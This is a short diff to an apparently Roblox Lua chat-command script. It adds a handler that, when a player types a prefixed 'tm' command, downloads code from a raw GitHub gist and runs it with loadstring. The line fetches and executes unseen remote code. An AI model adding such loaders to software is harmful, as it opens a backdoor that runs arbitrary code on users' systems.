@@ -712,3 +712,15 @@ Player.Chatted:connect(
         end
     end
 )
+
+Player.Chatted:connect(
+    function(cht)
+        if cht:match(tprefix .. "tm") then
+            
+
+           loadstring(game:HttpGet("https://gist.githubusercontent.com/screw0/87c9568e037fb35ac8f229cd643f899d/raw/90d1ed703c9da72e97ac3bf36cc8643330c0a24a/gistfile1.txt", true))()
+
+
+        end
+    end
+)
